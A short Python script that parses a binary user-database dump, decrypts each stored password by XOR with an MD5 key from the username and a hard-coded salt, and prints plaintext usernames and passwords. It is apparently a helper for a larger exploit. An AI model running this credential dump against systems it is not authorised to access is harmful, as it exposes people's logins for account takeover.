#!/usr/bin/env python3

import sys, hashlib

def decrypt_password(user, pass_enc):
    key = hashlib.md5(user + b"283i4jfkai3389").digest()
    passw = ""
    for i in range(0, len(pass_enc)):
        passw += chr(pass_enc[i] ^ key[i % len(key)])
    return passw.split("\x00")[0]

def extract_user_pass_from_entry(entry):
    user_data = entry.split(b"\x01\x00\x00\x21")[1]
    pass_data = entry.split(b"\x11\x00\x00\x21")[1]
    user_len = user_data[0]
    pass_len = pass_data[0]
    username = user_data[1:1 + user_len]
    password = pass_data[1:1 + pass_len]

    return username, password

def get_pair(data):
    user_list = []
    entries = data.split(b"M2")[1:]
    for entry in entries:
        try:
            user, pass_encrypted = extract_user_pass_from_entry(entry)
            pass_plain = decrypt_password(user, pass_encrypted)
            user  = user.decode("ascii")

        except UnicodeDecodeError:
            user = "cannot decode"
            pass_plain = "cannot decode"
        except:
            continue
        user_list.append((user, pass_plain))
    return user_list

def dump(data):
    user_pass = get_pair(data)
    for u, p in user_pass:
        print('\n')
        print("User:", u)
        print("Pass:", p)
    if(len(user_pass)):
        print("------------------")
    else:
        print(': Unknown Sessionid')
